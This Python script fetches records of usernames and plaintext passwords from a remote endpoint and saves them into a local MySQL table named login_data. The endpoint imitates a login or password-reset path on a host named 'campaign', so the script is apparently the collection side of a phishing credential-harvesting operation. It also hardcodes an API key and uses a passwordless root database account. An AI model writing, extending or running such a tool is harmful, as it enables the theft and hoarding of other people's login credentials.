"""
Manual Sync Script - One-time sync from cloud to local MySQL
Use this for manual/on-demand syncing
"""

import requests
import mysql.connector
from datetime import datetime
import sys

# ============ CONFIGURATION ============
CLOUD_URL = "https://campaign-rzp2.onrender.com/Account/Login/password-reset/fetch-entries"
API_KEY = "abcdefghijklmnopnp2025"

MYSQL_CONFIG = {
    'host': 'localhost',
    'user': 'root',
    'password': '',
    'database': 'pnp_data'
}
# =======================================

def manual_sync(fetch_all=False):
    """Perform a manual sync"""
    print("\n" + "=" * 60)
    print("  MANUAL CLOUD TO LOCAL SYNC")
    print("=" * 60)
    
    try:
        # Prepare request
        headers = {
            'Authorization': f'Bearer {API_KEY}',
            'Content-Type': 'application/json'
        }
        
        # If fetch_all is True, don't send last_sync_timestamp
        payload = {
            'last_sync_timestamp': '' if fetch_all else None
        }
        
        print(f"\nFetching data from: {CLOUD_URL}")
        if fetch_all:
            print("Mode: Fetch ALL entries")
        else:
            print("Mode: Fetch new entries only")
        
        # Fetch from cloud
        response = requests.post(CLOUD_URL, headers=headers, json=payload, timeout=30)
        
        if response.status_code != 200:
            print(f"\n✗ Error: Server returned status {response.status_code}")
            if response.status_code == 401:
                print("  Authentication failed. Check your API_KEY")
            return
        
        result = response.json()
        entries = result.get('entries', [])
        
        if not entries:
            print("\n✓ No entries found to sync")
            return
        
        print(f"\n✓ Retrieved {len(entries)} entries from cloud")
        
        # Connect to database
        print("\nConnecting to MySQL database...")
        conn = mysql.connector.connect(**MYSQL_CONFIG)
        cursor = conn.cursor()
        
        # Create table if not exists
        create_table = """
        CREATE TABLE IF NOT EXISTS login_data (
            id INT AUTO_INCREMENT PRIMARY KEY,
            username VARCHAR(255) NOT NULL,
            password VARCHAR(255) NOT NULL,
            timestamp VARCHAR(100) NOT NULL,
            synced_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            INDEX idx_timestamp (timestamp)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
        """
        cursor.execute(create_table)
        
        # Insert entries
        insert_query = """
        INSERT INTO login_data (username, password, timestamp)
        VALUES (%s, %s, %s)
        """
        
        saved = 0
        skipped = 0
        
        print("\nSaving to database...")
        for i, entry in enumerate(entries, 1):
            try:
                cursor.execute(insert_query, (
                    entry['username'],
                    entry['password'],
                    entry['timestamp']
                ))
                saved += 1
                print(f"  [{i}/{len(entries)}] ✓ Saved: {entry['username']}")
            except mysql.connector.IntegrityError:
                skipped += 1
                print(f"  [{i}/{len(entries)}] - Skipped (duplicate): {entry['username']}")
        
        conn.commit()
        cursor.close()
        conn.close()
        
        print("\n" + "=" * 60)
        print(f"SYNC COMPLETE")
        print(f"  Saved: {saved}")
        print(f"  Skipped: {skipped}")
        print(f"  Total: {len(entries)}")
        print("=" * 60 + "\n")
        
    except requests.exceptions.RequestException as e:
        print(f"\n✗ Connection error: {e}")
    except mysql.connector.Error as err:
        print(f"\n✗ Database error: {err}")
    except Exception as e:
        print(f"\n✗ Unexpected error: {e}")

if __name__ == '__main__':
    # Check if user wants to fetch all data
    fetch_all = '--all' in sys.argv or '-a' in sys.argv
    
    if fetch_all:
        confirm = input("This will fetch ALL entries from cloud. Continue? (y/n): ")
        if confirm.lower() != 'y':
            print("Cancelled.")
            sys.exit(0)
    
    manual_sync(fetch_all)